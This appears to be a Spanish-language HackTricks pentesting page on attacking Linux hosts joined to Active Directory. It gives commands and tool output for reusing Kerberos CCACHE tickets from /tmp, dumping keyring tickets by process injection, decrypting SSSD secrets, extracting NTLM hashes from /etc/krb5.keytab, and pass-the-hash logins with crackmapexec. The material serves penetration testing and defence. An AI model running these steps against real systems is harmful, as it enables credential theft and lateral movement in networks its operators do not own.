# Linux Active Directory

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* ¿Trabajas en una **empresa de ciberseguridad**? ¿Quieres ver tu **empresa anunciada en HackTricks**? ¿O quieres tener acceso a la **última versión de PEASS o descargar HackTricks en PDF**? ¡Consulta los [**PLANES DE SUSCRIPCIÓN**](https://github.com/sponsors/carlospolop)!
* Descubre [**The PEASS Family**](https://opensea.io/collection/the-peass-family), nuestra colección exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
* Obtén el [**swag oficial de PEASS y HackTricks**](https://peass.creator-spring.com)
* **Únete al** [**💬**](https://emojipedia.org/speech-balloon/) [**grupo de Discord**](https://discord.gg/hRep4RUj7f) o al [**grupo de telegram**](https://t.me/peass) o **sígueme** en **Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Comparte tus trucos de hacking enviando PR al [repositorio de hacktricks](https://github.com/carlospolop/hacktricks) y al [repositorio de hacktricks-cloud](https://github.com/carlospolop/hacktricks-cloud)**.

</details>

Una máquina Linux también puede estar presente dentro de un entorno de Active Directory.

Una máquina Linux en un AD podría estar **almacenando diferentes tickets CCACHE dentro de archivos. Estos tickets pueden ser utilizados y abusados como cualquier otro ticket Kerberos**. Para leer estos tickets, deberás ser el propietario del usuario del ticket o **root** dentro de la máquina.

## Enumeración

### Enumeración de AD desde Linux

Si tienes acceso a un AD en Linux (o bash en Windows), puedes probar [https://github.com/lefayjey/linWinPwn](https://github.com/lefayjey/linWinPwn) para enumerar el AD.

También puedes consultar la siguiente página para aprender **otras formas de enumerar AD desde Linux**:

{% content-ref url="../../network-services-pentesting/pentesting-ldap.md" %}
[pentesting-ldap.md](../../network-services-pentesting/pentesting-ldap.md)
{% endcontent-ref %}

### FreeIPA

Es una **alternativa** de código abierto a Microsoft Windows **Active** **Directory**, utilizada principalmente como solución de gestión integrada para entornos **Unix**. Obtén más información al respecto en:

{% content-ref url="../freeipa-pentesting.md" %}
[freeipa-pentesting.md](../freeipa-pentesting.md)
{% endcontent-ref %}

## Jugando con tickets

### Pass The Ticket

En esta página encontrarás diferentes lugares donde podrías **encontrar tickets Kerberos dentro de un host Linux**, en la siguiente página puedes aprender cómo transformar estos formatos de tickets CCache a Kirbi (el formato que necesitas usar en Windows) y también cómo realizar un ataque PTT:

{% content-ref url="../../windows-hardening/active-directory-methodology/pass-the-ticket.md" %}
[pass-the-ticket.md](../../windows-hardening/active-directory-methodology/pass-the-ticket.md)
{% endcontent-ref %}

### Reutilización de tickets CCACHE desde /tmp

> Cuando los tickets se configuran para almacenarse como un archivo en disco, el formato y tipo estándar es un archivo CCACHE. Este es un formato de archivo binario simple para almacenar credenciales Kerberos. Estos archivos se almacenan típicamente en /tmp y se limitan con permisos 600.

Lista el ticket actual utilizado para la autenticación con `env | grep KRB5CCNAME`. El formato es portátil y el ticket se puede **reutilizar configurando la variable de entorno** con `export KRB5CCNAME=/tmp/ticket.ccache`. El formato del nombre del ticket Kerberos es `krb5cc_%{uid}`, donde uid es el UID del usuario.
```bash
ls /tmp/ | grep krb5cc
krb5cc_1000
krb5cc_1569901113
krb5cc_1569901115

export KRB5CCNAME=/tmp/krb5cc_1569901115
```
### Reutilización de tickets CCACHE desde el keyring

Los procesos pueden **almacenar tickets Kerberos en su memoria**, esta herramienta puede ser útil para extraer esos tickets (la protección ptrace debe estar deshabilitada en la máquina `/proc/sys/kernel/yama/ptrace_scope`): [https://github.com/TarlogicSecurity/tickey](https://github.com/TarlogicSecurity/tickey)
```bash
# Configuration and build
git clone https://github.com/TarlogicSecurity/tickey
cd tickey/tickey
make CONF=Release

[root@Lab-LSV01 /]# /tmp/tickey -i
[*] krb5 ccache_name = KEYRING:session:sess_%{uid}
[+] root detected, so... DUMP ALL THE TICKETS!!
[*] Trying to inject in tarlogic[1000] session...
[+] Successful injection at process 25723 of tarlogic[1000],look for tickets in /tmp/__krb_1000.ccache
[*] Trying to inject in velociraptor[1120601115] session...
[+] Successful injection at process 25794 of velociraptor[1120601115],look for tickets in /tmp/__krb_1120601115.ccache
[*] Trying to inject in trex[1120601113] session...
[+] Successful injection at process 25820 of trex[1120601113],look for tickets in /tmp/__krb_1120601113.ccache
[X] [uid:0] Error retrieving tickets
```
### Reutilización de tickets CCACHE desde SSSD KCM

SSSD mantiene una copia de la base de datos en la ruta `/var/lib/sss/secrets/secrets.ldb`. La clave correspondiente se almacena como un archivo oculto en la ruta `/var/lib/sss/secrets/.secrets.mkey`. Por defecto, la clave sólo es legible si se tienen permisos de **root**.

Invocar **`SSSDKCMExtractor`** con los parámetros --database y --key analizará la base de datos y **descifrará los secretos**.
```bash
git clone https://github.com/fireeye/SSSDKCMExtractor
python3 SSSDKCMExtractor.py --database secrets.ldb --key secrets.mkey
```
El **bloque Kerberos de caché de credenciales puede convertirse en un archivo CCache Kerberos** utilizable que puede ser pasado a Mimikatz/Rubeus.

### Reutilización de tickets CCACHE desde keytab
```bash
git clone https://github.com/its-a-feature/KeytabParser
python KeytabParser.py /etc/krb5.keytab
klist -k /etc/krb5.keytab
```
### Extraer cuentas de /etc/krb5.keytab

Las claves de servicio utilizadas por los servicios que se ejecutan como root se almacenan generalmente en el archivo de clave **`/etc/krb5.keytab`**. Esta clave de servicio es el equivalente a la contraseña del servicio y debe mantenerse segura.

Utilice [`klist`](https://adoptopenjdk.net/?variant=openjdk13\&jvmVariant=hotspot) para leer el archivo keytab y analizar su contenido. La clave que se ve cuando el [tipo de clave](https://cwiki.apache.org/confluence/display/DIRxPMGT/Kerberos+EncryptionKey) es 23 es el **hash NT real del usuario**.
```
klist.exe -t -K -e -k FILE:C:\Users\User\downloads\krb5.keytab
[...]
[26] Service principal: host/COMPUTER@DOMAIN
	 KVNO: 25
	 Key type: 23
	 Key: 31d6cfe0d16ae931b73c59d7e0c089c0
	 Time stamp: Oct 07,  2019 09:12:02
[...]
```
En Linux se puede utilizar [`KeyTabExtract`](https://github.com/sosdave/KeyTabExtract): queremos el hash RC4 HMAC para reutilizar el hash NLTM.
```bash
python3 keytabextract.py krb5.keytab 
[!] No RC4-HMAC located. Unable to extract NTLM hashes. # No luck
[+] Keytab File successfully imported.
        REALM : DOMAIN
        SERVICE PRINCIPAL : host/computer.domain
        NTLM HASH : 31d6cfe0d16ae931b73c59d7e0c089c0 # Lucky
```
En **macOS** puedes usar [**`bifrost`**](https://github.com/its-a-feature/bifrost).
```bash
./bifrost -action dump -source keytab -path test
```
Conéctese a la máquina utilizando la cuenta y el hash con CME.
```bash
$ crackmapexec 10.XXX.XXX.XXX -u 'COMPUTER$' -H "31d6cfe0d16ae931b73c59d7e0c089c0" -d "DOMAIN"
CME          10.XXX.XXX.XXX:445 HOSTNAME-01   [+] DOMAIN\COMPUTER$ 31d6cfe0d16ae931b73c59d7e0c089c0  
```
## Referencias

* [https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Active%20Directory%20Attack.md#linux-active-directory](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Active%20Directory%20Attack.md#linux-active-directory)

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* ¿Trabajas en una **empresa de ciberseguridad**? ¿Quieres ver tu **empresa anunciada en HackTricks**? ¿O quieres tener acceso a la **última versión de PEASS o descargar HackTricks en PDF**? ¡Consulta los [**PLANES DE SUSCRIPCIÓN**](https://github.com/sponsors/carlospolop)!
* Descubre [**The PEASS Family**](https://opensea.io/collection/the-peass-family), nuestra colección exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
* Obtén el [**swag oficial de PEASS y HackTricks**](https://peass.creator-spring.com)
* **Únete al** [**💬**](https://emojipedia.org/speech-balloon/) **grupo de Discord** o al [**grupo de telegram**](https://t.me/peass) o **sígueme** en **Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Comparte tus trucos de hacking enviando PR al [repositorio de hacktricks](https://github.com/carlospolop/hacktricks) y al [repositorio de hacktricks-cloud](https://github.com/carlospolop/hacktricks-cloud)**.

</details>
